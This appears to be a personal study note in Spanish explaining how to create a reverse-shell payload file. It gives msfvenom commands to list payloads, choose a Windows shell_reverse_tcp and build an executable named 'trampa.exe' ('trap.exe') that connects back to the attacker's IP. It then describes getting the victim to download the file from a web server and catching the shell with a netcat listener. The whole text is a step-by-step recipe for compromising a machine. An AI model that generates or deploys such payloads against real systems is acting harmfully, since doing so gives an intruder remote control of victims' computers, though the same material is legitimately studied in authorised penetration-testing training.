Vamos a aprender a crear ficheros que contengan payloads que nos permitan hacer una [[shell reversa]].

## Buscar ficheros

>`msfvenom -l payloads`
>Nos va a retornar todos los [[payloads]] que tienen disponibles esta herramienta (951 disponibles).

Si queremos los payloads para windows:

>`msfvenom -l payloads | grep windows`

Nos devuelve muchos resultados, para encontrar el adecuado, se recomienda buscar en el que ponga:

>`shell_reverse_tcp`
>Algo del estilo.

También podemos buscar archivos que sean del tipo php, py...

## Creación del fichero

>`msfvenom -p namePayload / pathPayload LHOST=ourIP LPORT=port -f exe -o trampa.exe`

**-p**: aquí se pone el nombre o path del payload, cómo se quiera mirar.

**LHOST**: aquí ponemos nuestra IP.

**LPORT**: el puerto por el que escuchamos.

**-f**: busca un fichero con extensión .exe.

**-o**: le da un nombre al archivo.

## Servidor web

Se recomienda (en el mundo del hacking) usar un servidor web en el que descargaremos este archivo.

No se hace nada del otro mundo, nos metemos desde el ordenador víctima y descargamos el archivo.

Ahora nos ponemos por escucha por el puerto por el que hemos especificado:

>`sudo nc -nlvp port`



